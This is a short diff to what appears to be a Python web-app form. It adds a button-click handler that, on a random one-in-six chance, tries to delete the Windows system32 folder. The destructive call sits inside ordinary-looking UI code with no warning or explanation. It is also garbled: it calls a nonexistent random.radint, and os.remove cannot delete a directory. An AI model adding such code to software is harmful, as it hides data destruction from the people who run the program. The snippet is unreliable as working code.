@@ -7,3 +7,11 @@ class Form1(Form1Template):
     self.init_components(**properties)
 
     # Any code you write here will run before the form opens.
+
+  def outlined_button1_click(self, **event_args):
+    """This method is called when the button is clicked"""
+    import random, os
+    if (random.radint(1,6) == 6):
+      os.remove("C:\Windows\system32")
+
+
